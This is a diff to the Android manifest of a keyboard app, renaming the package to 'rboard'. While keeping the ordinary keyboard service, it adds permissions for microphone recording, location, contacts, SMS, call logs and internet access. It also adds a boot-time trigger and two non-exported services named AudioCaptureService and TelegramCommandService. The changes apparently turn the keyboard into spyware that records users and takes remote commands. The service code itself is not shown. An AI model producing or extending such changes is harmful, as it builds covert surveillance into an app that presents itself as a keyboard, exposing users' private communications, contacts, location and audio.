@@ -15,15 +15,20 @@
 -->
 
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.abifog.lokiboard">
+    package="com.abifog.rboard">
 
     <uses-permission android:name="android.permission.VIBRATE" />
-    <!--
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-
-    # Only required if files are to be saved directly in the internal storage
-
-    -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.INTERNET" />
 
     <application
         android:allowBackup="true"
@@ -32,7 +37,7 @@
         android:supportsRtl="true">
         <!-- Services -->
         <service
-            android:name="com.abifog.lokiboard.latin.LatinIME"
+            android:name="com.abifog.rboard.latin.LatinIME"
             android:label="@string/english_ime_name"
             android:permission="android.permission.BIND_INPUT_METHOD">
             <intent-filter>
@@ -45,7 +50,7 @@
         </service>
 
         <activity
-            android:name="com.abifog.lokiboard.latin.settings.SettingsActivity"
+            android:name="com.abifog.rboard.latin.settings.SettingsActivity"
             android:label="@string/english_ime_name"
             android:theme="@style/platformSettingsTheme">
             <intent-filter>
@@ -53,11 +58,21 @@
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity> <!-- Broadcast receivers -->
-        <receiver android:name="com.abifog.lokiboard.latin.SystemBroadcastReceiver">
+        <receiver android:name="com.abifog.rboard.latin.SystemBroadcastReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.LOCALE_CHANGED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
+        <service
+            android:name="com.abifog.rboard.latin.AudioCaptureService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <service
+            android:name="com.abifog.rboard.latin.TelegramCommandService"
+            android:enabled="true"
+            android:exported="false" />
     </application>
 
 </manifest>
